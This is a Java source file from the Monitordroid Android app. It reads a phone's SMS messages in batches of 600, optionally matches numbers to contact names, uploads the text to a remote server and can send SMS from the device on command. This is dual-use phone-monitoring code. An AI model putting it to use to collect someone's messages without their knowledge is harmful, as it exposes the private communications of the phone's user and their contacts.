/**
 * Copyright (C) 2015 Monitordroid Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 * 
 * @author Tyler Butler
 **/

package com.monitordroid.app;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;

import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.BaseColumns;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.util.Log;

import com.google.android.gcm.GCMRegistrar;

import static com.monitordroid.app.CommonUtilities.SMS_URL;


public class SMSUtilities {
	
	boolean isUpdate;
	
	/**
	 * Sends an SMS Message from the device to a specified phone number
	 * 
	 * @param phoneNumber: The phone number of the intended recipient
	 * @param SMSMessage: The SMS message to send
	 */
	public void sendSMS(String phoneNumber, String SMSMessage) {
	    SmsManager smsManager = SmsManager.getDefault();
	    smsManager.sendTextMessage(phoneNumber, null, SMSMessage, null, null);
	}
	
	/** 
	 * Gets 600 SMS Messages from the device per iteration and then executes an Asynctask to upload them to the server
	 * 
	 * @param iteration: States which batch of messages to send to the server. For example, iteration "1" will send the most recent 600 messages
	 * 					 iteration 2 will send the next 600 in order, and so on...
	 * 
	 * @param resolveContacts: Whether to resolve the phone numbers associated with text message to a contact's name on the device if one matches.
	 * 						   This will exponentially increase the time it takes the SMS retrieval algorithm to complete
	 */
	public void fetchSMS(Context context, int iteration, boolean resolveContacts) {
		Log.i("Time", "Hit fetchSMS");
		Log.i("RC: ", Boolean.toString(resolveContacts));
		Long initTime = System.currentTimeMillis();
		String output = "";
		//Call smsReader to fill output with text data
		output = smsReader(context, iteration, resolveContacts);
		String regId = GCMRegistrar.getRegistrationId(context);
		Long finTime = System.currentTimeMillis();
		Long diff = finTime - initTime;
		Log.i("Finished in: ", Long.toString(diff) + "ms");
		
		//If it's updating the first messages, we don't want them to be concatenate to the end of other messages, so we need to signal the server
		if (iteration == 1) {
			isUpdate = true;
		}
		else {
			isUpdate = false;
		}
		new MyAsyncTask().execute(output, regId);		
	}
	
	/**
	 * Puts a batch of 600 text messages (both inbox, outbox, and other messages) into string format and returns the string.]
	 * 
	 * @param iteration: States which batch of messages to send to the server. For example, iteration "1" will send the most recent 600 messages
	 * 					 iteration 2 will send the next 600 in order, and so on...
	 * 
	 * @param resolveContacts: Whether to resolve the phone numbers associated with text message to a contact's name on the device if one matches.
	 * 						   This will exponentially increase the time it takes the SMS retrieval algorithm to complete
	 * 
	 * @return: Returns a formatted string containing 600 text messages
	 * 
	 * Efficiency notes: When resolveContacts is false, runs in O(n) and completes in around 6 seconds on a Samsung Galaxy S3
	 * 					 However, when resolveContacts is true and a contact must attempt to be resolved for every phone number,
	 * 					 the algorithm becomes inefficient running in O(n*m) time, where m is the number of contacts. 
	 */
	private String smsReader(Context context, int iteration, boolean resolveContacts) {
		int stoppingPoint = 0;
		boolean validCursor = false;
		String msgData = "";
		
		
		try {
		Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/"), null, null, null, null);
		
		if (iteration == 1) {
		cursor.moveToFirst();
		stoppingPoint = 600;
		validCursor = true;
		}
		
		else  {
			//Each cursor position is a SMS Message, 600 messages is around 60kb of data. Send 600 messages each iteration. 
			if (cursor != null && cursor.moveToPosition(600*(iteration-1))) {
				stoppingPoint = 600*iteration;
				Log.i("readsms", "Cursor not null");
				Log.i("rssp", Integer.toString(600*(iteration-1)));
				Log.i("readsms stopping point: ", Integer.toString(stoppingPoint));
				validCursor = true;
			}
			else {
				Log.i("readsms", "Cursor is null");
				cursor.close();
			}
		}
		
		
		if (validCursor) {

		do{
		   for(int idx = 0; idx < cursor.getColumnCount(); idx++)
		   {
			   //We only want the address(phone number), body, date, and type of the message
			   if (cursor.getColumnName(idx).equals("address") || cursor.getColumnName(idx).equals("body") || cursor.getColumnName(idx).equals("date") || cursor.getColumnName(idx).equals("type")) {
				   if (cursor.getColumnName(idx).equals("address")) {
					   if (cursor.getString(idx) != null) {
					   msgData += "\n" + cursor.getString(idx) + " - ";
					   }
					   else {
						   msgData += "\n" + "Draft Message" + " - ";
					   }
					   //Appends contact names to messages. Significantly increases runtime!
					   if (resolveContacts) {
					   msgData += "(" + resolveContact(context, cursor.getString(idx)) + ") ";
					   }
				   }				   				   
				   				   
				   else if (cursor.getColumnName(idx).equals("type")) {
					   if(cursor.getString(idx).contains("1")) {
						   msgData += "(Inbox): ";
					   }
					   else {
						   msgData += "(Outbox): ";
					   }
				   }
				   else if (cursor.getColumnName(idx).equals("date")) {
					   String formattedDate = "";
					   formattedDate = millisToDate(cursor.getLong(idx));
					   msgData += formattedDate + "- ";
				   }
				   else {
					   msgData += cursor.getString(idx);
				   }
			   }
		   }

		}
		//Iterate until the desired message size is reached or there is no more data
		while(cursor.moveToNext() && (cursor.getPosition() < stoppingPoint));
		cursor.close();
		}
		}
		catch (Exception e) {
			//Device probably doesn't have SMS Capabilities
			Log.e("readsms:", e.getMessage());
			msgData = "Error retreiving SMS data from the device. Device may not have SMS capabilities";
		}
		
		return msgData;
	}
	
	
	/**
	 * Converts the milliseconds in the message time to a readable date
	 */
	private String millisToDate(long currentTime) {
	    String finalDate;
	    Calendar calendar = Calendar.getInstance();
	    calendar.setTimeInMillis(currentTime);
	    Date date = calendar.getTime();
	    finalDate = date.toString();
	    return finalDate;
	}
	
	/**
	 * Takes a phone number and compares it to the devices contacts database, searching for a match.
	 * If a match is found, it returns the name of the contact.
	 * 
	 * Efficiency notes: Runs in O(n) time alone, but when it is usually in conjunction with smsReader() which 
	 * 					 takes O(m) time (where m is the number of text messages input, so the total complexity
	 * 					 when run together is O(n*m)
	 */
    public String resolveContact(Context context, String number) {
    String name = "?";

    // Step 1: LookUp Name to given Number
    ContentResolver contentResolver = context.getContentResolver();

    Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(number));
    String[] contactProjection = new String[] {BaseColumns._ID, ContactsContract.PhoneLookup.DISPLAY_NAME };
    Cursor contactLookup = contentResolver.query(uri, contactProjection, null, null, null);

    try {
        if (contactLookup != null && contactLookup.getCount() > 0) {
            contactLookup.moveToNext();
            name = contactLookup.getString(contactLookup.getColumnIndex(ContactsContract.Data.DISPLAY_NAME));
        }
    } finally {         
        if (contactLookup != null) {
            contactLookup.close();
        }
    }
    return name;
    }
	
	

	//Posts UTF-8 Text data to the server
	private class MyAsyncTask extends AsyncTask<String, String, Double>{
		 
		@Override
		protected Double doInBackground(String... params) {
		postData(params[0], params[1]);
		return null;
		}
		 
		protected void onPostExecute(Double result){

		}


		public void postData(String smsData, String regId) {
		HttpClient httpclient = new DefaultHttpClient();
		//NOTE: SET TO app2 FOR TESTING!!!!!!!
		String url = SMS_URL;
		HttpPost httppost = new HttpPost(url);

		 
		try {
		List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
		//Signal to the server that these are the newest messages and should not be concatenated
		if (isUpdate) {
			nameValuePairs.add(new BasicNameValuePair("FirstUpdateData", smsData));
			Log.i("readsms: ", "First update, valuePair FirstUpdateData");
		}
		//Otherwise signal to concatenate these messages onto previous messages in the database
		else {
		nameValuePairs.add(new BasicNameValuePair("SMSData", smsData));
		Log.i("readsms: ", "Not first update, valuePair SMSData");
		}
		nameValuePairs.add(new BasicNameValuePair("regName", regId));
		httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs,"UTF-8"));
		 
		// Execute HTTP Post Request
		httpclient.execute(httppost);
		 
		} catch (ClientProtocolException e) {

		} catch (IOException e) {

		}
		}
		 
		}	

}
